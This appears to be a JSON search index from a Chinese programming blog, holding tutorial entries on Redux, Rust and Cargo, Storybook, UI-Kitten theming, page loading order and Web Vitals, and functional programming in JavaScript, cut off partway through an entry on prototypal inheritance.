返回下一个状态。记住要返回新的状态对象，而不是改变以前的状态。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  function visibilityFilter(state = \u0026#39;SHOW_ALL\u0026#39;, action) { switch (action.type) { case \u0026#39;SET_VISIBILITY_FILTER\u0026#39;: return action.filter default: return state } } function todos(state = [], action) { switch (action.type) { case \u0026#39;ADD_TODO\u0026#39;: return [ ...state, { text: action.text, completed: false } ] case \u0026#39;COMPLETE_TODO\u0026#39;: return state.map((todo, index) =\u0026gt; { if (index === action.index) { return Object.assign({}, todo, { completed: true }) } return todo }) default: return state } } import { combineReducers, createStore } from \u0026#39;redux\u0026#39; const reducer = combineReducers({ visibilityFilter, todos }) const store = createStore(reducer)   3. 词汇表 1). State 状态 type State = any 由 store 管理并由 getState() 获取。\n不要在 State 中放任何不能轻易转换成 JSON 的东西，应该尽最大努力保持状态可序列化。\n2). Action 动作 type Action = Object 必须有一个 type 字段来定义 action 的类型。类型可以定义为常量并从另一个模块导入。\n3). Reducer 减速器（最重要的概念） type Reducer\u0026lt;S, A\u0026gt; = (state: S, action: A) =\u0026gt; S Reducer 用于将值的集合减少为单个值,并不是 Redux 独有的，它是函数式编程中的一个基本概念。例如 Array.prototype.reduce()\n给定前一个state和一个action，Reducer 计算一个新state。它必须是纯函数 —— 对于给定的输入返回完全相同的输出的函数。\n不要将 API 调用放入 reducer。\n4). Dispatch 动作调度 type BaseDispatch = (a: Action) =\u0026gt; Action\rtype Dispatch = (a: Action | AsyncAction) =\u0026gt; any 区分一般调度和中间件调度。\n一般调度是同步的，中间件调度往往是异步的。\n5). Action creator 动作创建器 type ActionCreator\u0026lt;A, P extends any[] = any[]\u0026gt; = (...args: P) =\u0026gt; Action | AsyncAction 创建 action 的方法。\n如果 action 创建器需要读取当前状态、执行 API 调用或引起副作用（如路由转换），它应该返回异步 action 而不是一般 action。\n6). async Action 异步动作 type AsyncAction = any 不会立即传递给 reducer，而是在 异步action 转换为 同步action 后才触发 dispatch。\n7). Middleware 中间件 type MiddlewareAPI = { dispatch: Dispatch, getState: () =\u0026gt; State }\rtype Middleware = (api: MiddlewareAPI) =\u0026gt; (next: Dispatch) =\u0026gt; Dispatch 中间件是一个高阶函数，它通常将异步action转化为action。\n它在调度一个action和它到达reducer的那一刻之间提供了一个第三方扩展点。\n通常使用中间件进行日志记录、崩溃报告、与异步 API 通信、路由等。\n8). Store type Store = {\rdispatch: Dispatch //基本调度函数\rgetState: () =\u0026gt; State //返回Store的当前状态\rsubscribe: (listener: () =\u0026gt; void) =\u0026gt; () =\u0026gt; void //注册要在状态更改时调用的函数\rreplaceReducer: (reducer: Reducer) =\u0026gt; void //可用于实现热重载和代码拆分。很少用到。\r} store 是保存应用状态树的对象。\nRedux 应用中应该只有一个 store，因为逻辑发生在 reducer 级别。\n9). Store creator 创建器 type StoreCreator = (reducer: Reducer, preloadedState: ?State) =\u0026gt; Store 创建 store 的函数\n10). Store enhancer 增强器 type StoreEnhancer = (next: StoreCreator) =\u0026gt; StoreCreator 高阶函数，它组合store创建器以返回新的增强store创建器。Redux 中间件实现本身就是一个store增强器。\nstore增强器与 React 中的高阶组件的概念大致相同，有时也称为“组件增强器”。\n因为它不是实例，而是函数的普通对象集合，所以可以轻松创建和修改副本，而无需改变原始store。\n\r二、使用 Redux ","description":"Redux 是一个状态管理框架","id":22,"section":"react","tags":null,"title":"Redux","uri":"https://codthing.github.io/react/redux/redux-base/"},{"content":"高级人体工程学和低级控制在编程语言设计中往往是不一致的；Rust 挑战了这种冲突。 一、安装 下载安装器，然后运行该程序并遵循屏幕上的指示。\n二、获取最新的 Rust rustup update 三、Cargo: Rust 的构建工具和包管理器 在安装 Rustup 时，也会安装 Rust 构建工具和包管理器的最新稳定版，即 Cargo。\n1 2 3 4 5 6 7 8 9  cargo--version//检查 Rust 版本 cargonewhello-rust//创建新项目 cargobuild//构建项目 cargorun//运行项目 cargotest//测试项目 cargodoc//为项目构建文档 cargopublish//可以将库发布到 crates.io   四、创建新项目 cargo new hello-rust hello-rust\r|- Cargo.toml //为 Rust 的清单文件。其中包含了项目的元数据和依赖库。\r|- src |- main.rs //编写应用代码的地方。 cargo run 五、添加依赖 可以在crates.io，即 Rust 包的仓库中找到所有类别的库。\n在 Rust 中，把包称作“crates”。\n举例：使用名为 ferris-says\n添加 //在 `Cargo.toml` 文件中添加以下信息（从 crates.io 页面上获取）\r[dependencies]\rferris-says = \u0026#34;0.2\u0026#34; cargo build …之后 Cargo 就会安装该依赖。\n运行此命令会创建一个新文件 Cargo.lock，该文件记录了本地所用依赖库的精确版本。\n使用 //main.rs\ruse ferris_says::say; 这样就可以使用 ferris-says crate 中导出的 say 函数了。\n六、编写一个小应用 main.rs\nuse ferris_says::say;\ruse std::io::{ stdout, BufWriter };\rfn main() {\rlet out = b\u0026#34;Hello fellow Rustaceans!\u0026#34;;\rlet width = 24;\rlet mut writer = BufWriter::new(stdout());\rsay(out, width, \u0026amp;mut writer).unwrap();\r} cargo run ----------------------------\r\u0026lt; Hello fellow Rustaceans! \u0026gt;\r----------------------------\r\\\r\\\r_~^~^~_\r\\) / o o \\ (/\r\u0026#39;_ - _\u0026#39;\r/ \u0026#39;-----\u0026#39; \\\r","description":"构建可靠且高效软件能力的语言","id":23,"section":"rust","tags":null,"title":"Rust","uri":"https://codthing.github.io/rust/rust-base/"},{"content":"一、安装配置  在next.js项目中执行\n npx sb init\ryarn storybook  .storybook/preview.js 为 Storybook 配置 Next.js Images\n + import * as NextImage from \u0026#34;next/image\u0026#34;;\r+ const OriginalNextImage = NextImage.default;\r+ Object.defineProperty(NextImage, \u0026#34;default\u0026#34;, {\rconfigurable: true,\rvalue: (props) =\u0026gt; (\r\u0026lt;OriginalNextImage\r{...props}\runoptimized\r/\u0026gt;\r),\r});  package.json 为 Storybook 提供 Next.js 公共目录\n {\r...\r\u0026#34;scripts\u0026#34;: {\r- \u0026#34;storybook\u0026#34;: \u0026#34;start-storybook -p 6006\u0026#34;,\r- \u0026#34;build-storybook\u0026#34;: \u0026#34;build-storybook\u0026#34;\r+ \u0026#34;storybook\u0026#34;: \u0026#34;start-storybook -p 6006 -s ./public\u0026#34;,\r+ \u0026#34;build-storybook\u0026#34;: \u0026#34;build-storybook -s public\u0026#34;\r},\r...\r}  配置全局样式，这里使用 antd\n yarn add antd\r// `.storybook/preview.js` 为 Storybook 配置全局样式\rimport \u0026#39;antd/dist/antd.css\u0026#39;;\rexport const parameters = {\r...\r...\rlayout: \u0026#39;fullscreen\u0026#39;\r}; 二、编写故事流程 （组件 -\u0026gt; 故事）  故事细节\n 三、args 获取 状态数据 和 事件  使用其他故事的 args\n  传递给Storybook的事件的写法 (必须带有 \u0026hellip;props, 否则事件无法触发)\n 四、parameters 静态参数 \u0026amp; loaders 加载器 parameters 通常用于控制 Storybook 功能和插件的行为。（一般情况下不需要使用，但不可不知）\nloaders 用于加载故事的数据，加载器可用于加载任何资产、延迟加载组件或从远程 API 获取数据。（一般不需要使用，但不可不知）\n五、添加描述的方式 在组件的 interface 中，用多行注释的方式，SB会自动添加到Docs中的描述\n注意：注释格式一定要这样，否则不能显示; 如果不能自动刷新，则需要重启 yarn storybook\n1 2 3 4 5 6 7  interface ButtonProps { /** * 测试 */ primary?: boolean; }   ","description":"","id":24,"section":"react","tags":null,"title":"Storybook 最佳实践","uri":"https://codthing.github.io/react/storybook/sb-bp/"},{"content":"一、安装 //确保已安装 React Native CLI\rnpm un -g react-native-cli \u0026amp;\u0026amp; npm i -g @react-native-community/cli\r//用 Kitten 模板创建新项目\rnpx react-native init MyApp --template @ui-kitten/template-js\r//启动应用\ryarn android 二、配置路由（配置应用程序在屏幕之间导航，基于 React Navigation） 1.安装\n//核心库\ryarn add react-navigation\r//导航器使用的依赖项\ryarn add react-native-reanimated react-native-gesture-handler react-native-screens react-native-safe-area-context @react-native-community/masked-view 2.要完成react-native-gesture-handlerAndroid的安装，请对MainActivity.java进行以下修改\npackage com.reactnavigation.example;\rimport com.facebook.react.ReactActivity;\r+ import com.facebook.react.ReactActivityDelegate;\r+ import com.facebook.react.ReactRootView;\r+ import com.swmansion.gesturehandler.react.RNGestureHandlerEnabledRootView;\rpublic class MainActivity extends ReactActivity {\r@Override\rprotected String getMainComponentName() {\rreturn \u0026#34;Example\u0026#34;;\r}\r+ @Override\r+ protected ReactActivityDelegate createReactActivityDelegate() {\r+ return new ReactActivityDelegate(this, getMainComponentName()) {\r+ @Override\r+ protected ReactRootView createRootView() {\r+ return new RNGestureHandlerEnabledRootView(MainActivity.this);\r+ }\r+ };\r+ }\r} 3.然后将以下内容添加到条目文件的顶部，例如index.js或App.js\nimport \u0026#39;react-native-gesture-handler\u0026#39;;  注意：使用导航器（例如 stack navigator 堆栈导航器）时，需要按照该导航器的安装说明进行操作，以获取任何其他依赖项。 如果遇到错误“无法解析模块”，则需要在项目中安装该模块。\n 三、主题工具 Eva Colors 四、配置主题  创建主题 context  //创建 theme-context.js 文件并粘贴以下代码\rimport React from \u0026#39;react\u0026#39;;\rexport const ThemeContext = React.createContext({\rtheme: \u0026#39;light\u0026#39;,\rtoggleTheme: () =\u0026gt; {},\r});\r//就React而言，context提供了一种通过组件树传递数据的方法，而不必在每个级别手动传递道具。\r//使用上面的代码，我们创建一个ThemeContext通过组件树提供有关当前主题的信息，因此任何组件都可以使用它。主题上下文的当前值为：\r//theme-确定当前主题的名称。\r//toggleTheme -可以切换当前主题的function。 注册主题  //打开 App.js 并粘贴下面的代码\rimport React from \u0026#39;react\u0026#39;;\rimport * as eva from \u0026#39;@eva-design/eva\u0026#39;;\rimport { ApplicationProvider, IconRegistry } from \u0026#39;@ui-kitten/components\u0026#39;;\rimport { EvaIconsPack } from \u0026#39;@ui-kitten/eva-icons\u0026#39;;\rimport { AppNavigator } from \u0026#39;./navigation.component\u0026#39;;\rimport { ThemeContext } from \u0026#39;./theme-context\u0026#39;; //导入ThemeContext\rexport default () =\u0026gt; {\r//创建{ theme, toggleTheme }，此对象成为了主题context，使用useState函数创建一个应用程序状态，以保存当前主题的名称\rconst [theme, setTheme] = React.useState(\u0026#39;light\u0026#39;);\r//切换当前主题function\rconst toggleTheme = () =\u0026gt; {\rconst nextTheme = theme === \u0026#39;light\u0026#39; ? \u0026#39;dark\u0026#39; : \u0026#39;light\u0026#39;;\rsetTheme(nextTheme);\r};\rreturn (\r\u0026lt;\u0026gt;\r\u0026lt;IconRegistry icons={EvaIconsPack}/\u0026gt;\r\u0026lt;ThemeContext.Provider value={{ theme, toggleTheme }}\u0026gt;\r\u0026lt;ApplicationProvider {...eva} theme={eva[theme]}\u0026gt;\r\u0026lt;AppNavigator/\u0026gt;\r\u0026lt;/ApplicationProvider\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r\u0026lt;/\u0026gt;\r);\r}; 用法  //在 home.component.js 中通过按下按钮进行修改以切换主题\rimport React from \u0026#39;react\u0026#39;;\rimport { SafeAreaView } from \u0026#39;react-native\u0026#39;;\rimport { Button, Layout } from \u0026#39;@ui-kitten/components\u0026#39;;\rimport { ThemeContext } from \u0026#39;./theme-context\u0026#39;;\rexport const HomeScreen = ({ navigation }) =\u0026gt; {\rconst themeContext = React.useContext(ThemeContext);\rconst navigateDetails = () =\u0026gt; {\rnavigation.navigate(\u0026#39;Details\u0026#39;);\r};\rreturn (\r\u0026lt;SafeAreaView style={{ flex: 1 }}\u0026gt;\r\u0026lt;Layout style={{ flex: 1, justifyContent: \u0026#39;center\u0026#39;, alignItems: \u0026#39;center\u0026#39; }}\u0026gt;\r\u0026lt;Button style={{ marginVertical: 4 }} onPress={navigateDetails}\u0026gt;OPEN DETAILS\u0026lt;/Button\u0026gt;\r\u0026lt;Button style={{ marginVertical: 4 }} onPress={themeContext.toggleTheme}\u0026gt;TOGGLE THEME\u0026lt;/Button\u0026gt;\r\u0026lt;/Layout\u0026gt;\r\u0026lt;/SafeAreaView\u0026gt;\r);\r}; 五、注意事项 导入 import 组件一定要用{组件名}包裹住，否则将不能正确解析。\n","description":"","id":25,"section":"react-native","tags":null,"title":"UI-Kitten 基础","uri":"https://codthing.github.io/react-native/ui/ui-kitten/kitten-base/"},{"content":"Storybook 是一个用于 UI 开发的工具。\n它通过隔离组件使开发更快更容易。 一次处理一个组件。\n可以开发整个 UI，而无需启动复杂的开发堆栈、将某些数据强制输入数据库或浏览应用程序。\n使用 Storybook 在 Web 应用程序中构建小的原子组件和复杂的页面。\n如果是 UI，则可以使用 Storybook 构建它。\nStorybook 可帮助记录组件以供重用，并自动对组件进行可视化测试以防止出现错误。\n使用插件生态系统扩展 Storybook，可帮助执行诸如微调响应式布局或验证可访问性等操作。\nStorybook 与最流行的 JavaScript UI 框架集成，并且（实验性地）支持服务器渲染的组件框架，例如 Ruby on Rails。\n\r知识点   CDD 组件驱动开发\n  教程\n  ","description":"React Storybook 简介","id":26,"section":"react","tags":null,"title":"介绍","uri":"https://codthing.github.io/react/storybook/sb-started/sb-introduction/"},{"content":"如何使用 Storybook 测试 UI Storybook 为隔离测试组件提供了一个洁净室环境。\n无论多么复杂，故事都可以轻松探索组件的所有变体。\n这意味着故事是 UI 测试策略的实用起点。\n将故事作为 UI 开发的一个自然组成部分，测试这些故事是防止随着时间的推移出现 UI 错误的一种省力的方法。\n最简单的测试方法是手动“抽查”。\n本地运行 Storybook，然后观察每个故事以验证其外观和行为。\n在线发布故事书以共享复制品并让队友参与其中。\nStorybook 还附带工具、测试运行程序以及与更强大的 JavaScript 生态系统的便捷集成，以扩展 UI 测试覆盖范围。\n","description":"","id":27,"section":"react","tags":null,"title":"介绍","uri":"https://codthing.github.io/react/storybook/sb-test/sb-test-introduction/"},{"content":"注意：本文深受 Chrome 中 Aurora 团队的见解的影响，尤其是 Shubhie Panicker，他一直在研究最佳加载顺序。\n在每个成功的网页加载中，一些关键组件和资源会在适当的时候变为可用，从而为您提供流畅的加载体验。\n这可确保用户认为应用程序的性能非常出色。这种出色的用户体验通常也应该转化为通过 Core Web Vitals。\n用于衡量性能的关键指标，例如 First Content Paint、Largest Contentful Paint、First Input Delay 等，直接取决于关键资源的加载顺序。\n例如，如果没有加载像英雄图像这样的关键资源，页面就不能有它的 LCP。\n这篇文章讲的是资源的加载顺序和Web Vitals之间的关系。我们的目标是提供有关如何优化加载顺序以获得更好的 Web 重要信息的明确指导。\n在建立一个理想的加载顺序之前，首先尝试理解为什么很难获得正确的加载顺序。\n\r为什么难以实现最佳加载？ 我们有独特的机会为我们合作伙伴的许多网站进行性能分析。 发现了多个类似的问题，这些问题困扰着不同合作伙伴网站的页面高效加载。\n开发人员的期望与浏览器如何优先考虑页面上的资源之间通常存在重大差距。 这通常会导致次优的性能得分。 我们进一步分析以发现造成这种差距的原因，以下几点总结了我们分析的本质。\n次优测序\nWeb Vitals 优化不仅需要很好地理解每个指标的含义，还需要它们出现的顺序以及它们与不同关键资源的关系。 FCP 发生在 LCP 之前，而 LCP 发生在 FID 之前。 因此，实现 FCP 所需的资源应优先于 LCP 所需的资源，其次是 FID 所需的资源。\n资源通常没有以正确的顺序排序和流水线化。 这可能是因为开发人员没有意识到指标对资源负载的依赖性。 因此，有时无法在正确的时间使用相关资源来触发相应的指标。\n例子：\n  a) 到 FCP 触发时，英雄图像应该可用于触发 LCP。\n  b) 到 LCP 触发时，JavaScript (JS) 应该被下载、解析并准备好（或已经执行）以解除阻止交互 (FID)。\n  网络/CPU 利用率\n资源也没有适当地流水线化以确保充分利用 CPU 和网络。 当进程受网络限制时，这会导致 CPU 上的“死区时间”，反之亦然。\n一个很好的例子是可以同时或顺序下载的脚本。 由于在并发下载期间带宽被划分，因此下载所有脚本的总时间对于顺序下载和并发下载是相同的。 如果您同时下载脚本，则在下载期间 CPU 未得到充分利用。 但是，如果您按顺序下载脚本，则 CPU 可以在下载后立即开始处理第一个脚本。 这会导致更好的 CPU 和网络利用率。\n第三方 (3P) 产品\n通常需要 3P 库来向网站添加通用特性和功能。 第三方包括广告、分析、社交小部件、实时聊天和其他支持网站的嵌入。 第三方库带有自己的 JavaScript、图像、字体等\n3P 产品通常没有动力优化和支持消费者网站的加载性能。 它们可能具有沉重的 JavaScript 执行成本，从而延迟交互，或妨碍下载其他关键资源。\n包含 3P 产品的开发人员可能更关注他们在功能方面增加的价值，而不是性能影响。 因此，有时会随意添加 3P 资源，而没有充分考虑它如何适应整个加载顺序。 这使他们难以控制和安排。\n平台怪癖\n浏览器在对请求进行优先级排序和实现提示的方式上可能有所不同。 如果您对平台及其怪癖有深入的了解，优化会更容易。 特定浏览器的特定行为使得难以一致地实现所需的加载顺序。\n这方面的一个例子是铬平台上的预加载错误。 Preload (\u0026lt;link rel=preload\u0026gt;) 指令可以用来告诉浏览器尽快下载关键资源。 仅当您确定将在当前页面上使用该资源时才应使用它。 Chromium 中的错误导致它的行为使得通过 \u0026lt;link rel=preload\u0026gt; 发出的请求始终在预加载扫描器看到的其他请求之前启动，\n即使这些请求具有更高的优先级。 诸如此类的问题会影响优化计划。\nHTTP2 优先级\n协议本身并没有提供很多用于调整资源顺序和优先级的选项或旋钮。\n即使可以使用更好的优先级原语，HTTP2 优先级也存在一些潜在的问题，这使得优化排序变得困难。 主要是，我们无法预测服务器或 CDN 将按什么顺序优先处理对单个资源的请求。 一些 CDN 重新确定请求的优先级，而其他 CDN 实施部分、有缺陷或没有优先级。\n资源级优化\n有效的排序需要正在排序的资源得到最佳服务，以便它们能够快速加载。 关键的 CSS 应该被内联，图像的大小应该正确，JS 应该是代码拆分和增量交付的。\n该框架本身缺乏允许代码拆分和增量服务 JS 和数据的结构。 用户必须依靠以下之一来拆分大块的 1P JS\n  Modern React (Suspense / Concurrent mode / Data Fetching) - 这仍然仅可用于实验\n  使用动态导入的延迟加载 - 这不直观，开发人员需要手动确定拆分代码的边界。\n  在代码拆分时，由于粒度与性能的权衡，开发人员需要实现块的正确粒度。\n更高的粒度是可取的，因为它\n  最小化单个路由和后续用户交互所需的 JS\n  允许缓存常见的依赖项。 这确保库中的更改不需要重新获取整个包。\n  同时，代码拆分时的粒度太大可能很糟糕，因为太多的小块会降低单个块的压缩率并影响浏览器性能。\n资源优化还需要消除死代码或未使用的代码。 不必要的或过时的 JS 可能经常被运送到现代浏览器，这会对性能产生负面影响。 现代浏览器不需要将 JS 转译为 ES5 并与 polyfill 捆绑在一起。 库和 npm 包通常不以 ES 模块格式发布。 这使得打包者很难进行摇树和优化\n您可能已经注意到，这些问题并不限于一组特定的资源或平台。 要解决这些问题，需要了解整个技术堆栈以及如何合并不同的资源以实现最佳指标。 在我们定义整体优化策略之前，让我们先看看单个资源需求是如何破坏我们的目标的。\n\r有关资源的更多信息 - 关系、约束和优先级 \r知识点    ","description":"了解如何优化加载顺序以提高应用的可用速度","id":28,"section":"react-patterns","tags":null,"title":"优化加载顺序","uri":"https://codthing.github.io/react-patterns/performance-patterns/loading-sequence/"},{"content":"一、概述 函数式编程是一种方案简单、功能独立、对作用域外没有任何副作用的编程范式：INPUT -\u0026gt; PROCESS -\u0026gt; OUTPUT\n函数式编程：\n1）功能独立 —— 不依赖于程序的状态（比如可能发生变化的全局变量）；\n2）纯函数 —— 同一个输入永远能得到同一个输出；\n3）有限的副作用 —— 可以严格地限制函数外部对状态的更改\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // 函数返回表示“一杯绿茶（green tea）”的字符串 const prepareTea = () =\u0026gt; \u0026#39;greenTea\u0026#39;; /* 有一个函数（代表茶的种类）和需要几杯茶，下面的函数返回一个数组，包含字符串（每个字符串表示一杯特别种类的茶）。 */ const getTea = (numOfCups) =\u0026gt; { const teaCups = []; for(let cups = 1; cups \u0026lt;= numOfCups; cups += 1) { const teaCup = prepareTea(); teaCups.push(teaCup); } return teaCups; }; const tea4TeamFCC = getTea(2); // [ \u0026#39;greenTea\u0026#39;, \u0026#39;greenTea\u0026#39; ]   \r二、了解函数式编程术语 需求有变更，现在想要两种茶：绿茶（green tea）和红茶（black tea）。 事实证明，用户需求变更是很常见的。\n基于以上信息，需要重构上例中的 getTea 函数来处理多种茶的请求。\n可以修改 getTea 接受一个函数作为参数，使它能够修改茶的类型。 这让 getTea 更灵活，也使需求变更时为程序员提供更多控制权。\n首先，介绍一些术语：\nCallbacks 是被传递到另一个函数中调用的函数。\n例如在 filter 中，回调函数告诉 JavaScript 以什么规则过滤数组。\n函数就像其他正常值一样，可以赋值给变量、传递给另一个函数，或从其它函数返回，这种函数叫做头等 first class 函数。\n在 JavaScript 中，所有函数都是头等函数。\n将函数作为参数或返回值的函数叫做高阶 ( higher order) 函数。\n当函数被传递给另一个函数或从另一个函数返回时，那些传入或返回的函数可以叫做 lambda。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  // 函数返回表示“一杯绿茶（green tea）”的字符串 const prepareGreenTea = () =\u0026gt; \u0026#39;greenTea\u0026#39;; // 函数返回表示“一杯红茶（black tea）”的字符串 const prepareBlackTea = () =\u0026gt; \u0026#39;blackTea\u0026#39;; /* 有一个函数（代表茶的种类）和需要几杯茶，下面的函数返回一个数组，包含字符串（每个字符串表示一杯特别种类的茶）。 */ const getTea = (prepareTea, numOfCups) =\u0026gt; { const teaCups = []; for(let cups = 1; cups \u0026lt;= numOfCups; cups += 1) { const teaCup = prepareTea(); teaCups.push(teaCup); } return teaCups; }; const tea4GreenTeamFCC = getTea(prepareGreenTea, 1); // [ \u0026#39;greenTea\u0026#39; ] const tea4BlackTeamFCC = getTea(prepareBlackTea, 2); // [ \u0026#39;blackTea\u0026#39;, \u0026#39;blackTea\u0026#39; ]   \r三、了解使用命令式编程的危害 使用 函数式编程 是一个好的习惯。\n它使代码易于管理，避免潜在的 bug。\n但在开始之前，先看看 命令式编程 方法，以说明可能会遇到什么问题。\n在英语 (以及许多其他语言) 中，命令式 时常用来发出指令。 同样，命令式编程 是向计算机提供一套执行任务的声明。\n命令式编程 常常改变程序状态，例如更新全局变量。 一个典型的例子是编写 for 循环，它为一个数组的索引提供了准确的迭代方向。\n相反，函数式编程是声明式编程的一种形式。 通过调用方法或函数来告诉计算机要做什么。\nJavaScript 提供了许多处理常见任务的方法，所以无需写出让计算机应如何执行它们。 例如，可以用 map 函数替代上面提到的 for 循环来处理数组迭代。 这有助于避免语义错误，如调试章节介绍的 \u0026ldquo;Off By One Errors\u0026rdquo;。\n考虑这样的场景：在浏览器中浏览网页，并想操作打开的标签。\n下面试试用 面向对象 的思路来描述这种情景。\n 窗口对象由选项卡组成，通常会打开多个窗口。 窗口对象中每个打开网站的标题都保存在一个数组中。 在对浏览器进行了如打开新标签、合并窗口、关闭标签之类的操作后，需要输出所有打开的标签。 关掉的标签将从数组中删除，新打开的标签（为简单起见）则添加到数组的末尾。  代码编辑器中显示了此功能的实现，其中包含 tabOpen()，tabClose()，和 join() 函数。 tabs 数组是窗口对象的一部分用于储存打开页面的名称。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  // tabs 是在窗口中打开的每个站点的 title 的数组 const Window = function(tabs) { this.tabs = tabs; // 记录对象内部的数组 }; // 当将两个窗口合并为一个窗口时 Window.prototype.join = function(otherWindow) { this.tabs = this.tabs.concat(otherWindow.tabs); return this; }; // 当在最后打开一个选项卡时 Window.prototype.tabOpen = function(tab) { this.tabs.push(\u0026#39;new tab\u0026#39;); // 现在打开一个新的选项卡  return this; }; // 当关闭一个选项卡时 Window.prototype.tabClose = function(index) { // 使用 splice()。这会产生副作用（对原始数组的更改），在实践中应该避免。  var tabsAfterIndex = this.tabs.splice(index); const tabsBeforeIndex = this.tabs.splice(0, index); // 点击之前获取 tabs  const tabsAfterIndex = this.tabs.splice(1); // 点击之后获取 tabs  this.tabs = tabsBeforeIndex.concat(tabsAfterIndex); // 将它们合并起来  return this; }; // 创建三个浏览器窗口 const workWindow = new Window([\u0026#39;GMail\u0026#39;, \u0026#39;Inbox\u0026#39;, \u0026#39;Work mail\u0026#39;, \u0026#39;Docs\u0026#39;, \u0026#39;freeCodeCamp\u0026#39;]); // 邮箱、Google Drive 和其他工作地点 const socialWindow = new Window([\u0026#39;FB\u0026#39;, \u0026#39;Gitter\u0026#39;, \u0026#39;Reddit\u0026#39;, \u0026#39;Twitter\u0026#39;, \u0026#39;Medium\u0026#39;]); // 社交网站 const videoWindow = new Window([\u0026#39;Netflix\u0026#39;, \u0026#39;YouTube\u0026#39;, \u0026#39;Vimeo\u0026#39;, \u0026#39;Vine\u0026#39;]); // 娱乐网站  // 现在执行打开选项卡，关闭选项卡和其他操作 const finalTabs = socialWindow .tabOpen() // 打开一个新的选项卡，显示猫的图片  .join(videoWindow.tabClose(2)) // 关闭视频窗口的第三个选项卡，并合并  .join(workWindow.tabClose(1).tabOpen()); console.log(finalTabs.tabs);   \r三、使用函数式编程避免变化和副作用 上例的问题出在 tabClose() 函数里的 splice。\n不幸的是，splice 修改了调用它的原始数组，所以第二次调用它时是基于修改后的数组，才给出了意料之外的结果。\n这是一个小例子，还有更广义的定义 —— 在变量，数组或对象上调用一个函数，这个函数会改变对象中的变量或其他东西。\n函数式编程 的核心原则之一是不改变任何东西。\n变化会导致错误。\n如果一个函数不改变传入的参数、全局变量等数据，那么它造成问题的可能性就会小很多。\n前面的例子没有任何复杂的操作，但是 splice 方法改变了原始数组，导致 bug 产生。\n在函数式编程中，改变或变更叫做 mutation，这种改变的结果叫做副作用（side effect）。\n理想情况下，函数应该是不会产生任何副作用的 纯函数（pure function）。\n尝试掌握这个原则：不要改变代码中的任何变量或对象。\n1 2 3 4 5 6 7 8 9 10 11 12  // 全局变量 let fixedValue = 4; function incrementer() { return fixedValue + 1; }; console.log(incrementer()); // 5 console.log(fixedValue); // 4   \r四、传递参数以避免函数中的外部依赖 上例更接近 函数式编程 原则，但是仍然缺少一些东西。\n虽然没有改变全局变量值，但在没有全局变量 fixedValue 的情况下，incrementer 函数将不起作用。\n函数式编程的另一个原则是：总是显式声明依赖关系。 如果函数依赖于一个变量或对象，那么将该变量或对象作为参数直接传递到函数中。\n这样做会有很多好处。\n  其中一点是让函数更容易测试，因为确切地知道参数是什么，并且这个参数也不依赖于程序中的任何其他内容。\n  其次，这样做可以更加自信地更改，删除或添加新代码。 因为很清楚哪些是可以改的，哪些是不可以改的，这样就知道哪里可能会有潜在的陷阱。\n  最后，无论代码的哪一部分执行它，函数总是会为同一组输入生成相同的输出。\n  1 2 3 4 5 6 7 8 9 10 11 12  // 全局变量 let fixedValue = 4; function incrementer(value) { return value + 1 } console.log(incrementer(fixedValue)); // 5 console.log(fixedValue); // 4   \r五、在函数中重构全局变量 目前为止，已经看到了函数式编程的两个原则：\n  不要更改变量或对象 - 创建新变量和对象，并在需要时从函数返回它们。 提示：使用类似 const newArr = arrVar 的东西，其中 arrVar 是一个数组，只会创建对现有变量的引用，而不是副本。 所以更改 newArr 中的值会同时更改 arrVar 中的值。\n  声明函数参数 - 函数内的任何计算仅取决于参数，而不取决于任何全局对象或变量。\n  给数字增加 1 不够刺激，可以在处理数组或更复杂的对象时应用这些原则。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  // 全局变量 let bookList = [\u0026#34;西游记\u0026#34;, \u0026#34;红楼梦\u0026#34;, \u0026#34;金瓶梅\u0026#34;, \u0026#34;来生不做中国人\u0026#34;]; /* 这个函数将一本书添加到列表中并返回列表 */ // 新参数应该在 bookName 之前  function add(list, bookName) { return [...list, bookName]; } /* 这个函数从列表中删除一本书并返回列表 */ // 新参数应该出现在 bookName 一之前  function remove(list, bookName) { return list.filter(book =\u0026gt; book !== bookName); } let newBookList = add(bookList, \u0026#39;寂静岭\u0026#39;); let newerBookList = remove(bookList, \u0026#39;红楼梦\u0026#39;); let newestBookList = remove(add(bookList, \u0026#39;寂静岭\u0026#39;), \u0026#39;红楼梦\u0026#39;); console.log(newBookList); // [ \u0026#39;西游记\u0026#39;, \u0026#39;红楼梦\u0026#39;, \u0026#39;金瓶梅\u0026#39;, \u0026#39;来生不做中国人\u0026#39;, \u0026#39;寂静岭\u0026#39; ] console.log(newerBookList); // [ \u0026#39;西游记\u0026#39;, \u0026#39;金瓶梅\u0026#39;, \u0026#39;来生不做中国人\u0026#39; ] console.log(newestBookList); // [ \u0026#39;西游记\u0026#39;, \u0026#39;金瓶梅\u0026#39;, \u0026#39;来生不做中国人\u0026#39;, \u0026#39;寂静岭\u0026#39; ] console.log(bookList); // [ \u0026#39;西游记\u0026#39;, \u0026#39;红楼梦\u0026#39;, \u0026#39;金瓶梅\u0026#39;, \u0026#39;来生不做中国人\u0026#39; ]   \r知识点  函数式编程的原则  1）功能独立 —— 不依赖于程序的状态（比如可能发生变化的全局变量）；\n2）纯函数 —— 同一个输入永远能得到同一个输出；\n3）有限的副作用 —— 可以严格地限制函数外部对状态的更改\n","description":"函数式编程是一种方案简单、功能独立、对作用域外没有任何副作用的编程范式：INPUT -\u003e PROCESS -\u003e OUTPUT","id":29,"section":"javascript","tags":null,"title":"函数式编程理念","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/fn-programming/"},{"content":"一、关键字  对象 object：是数据的集合 原型继承 构造器 原型链 子类继承  JavaScript 中的（几乎）一切都是对象，除了原始值以外（number,string,boolean,undefined,null)\n二、经典继承 vs 原型继承 编程中的继承意味着一个对象基于另一个对象，并且可以访问其他对象的属性和方法。\nJavaScript 使用原型继承，它不像 C 或者 Java 那样的经典继承，这是一个重要的区别。\n   经典继承 原型继承     class prototype   对象实例从 class 继承 对象实例从其他对象继承   子 class 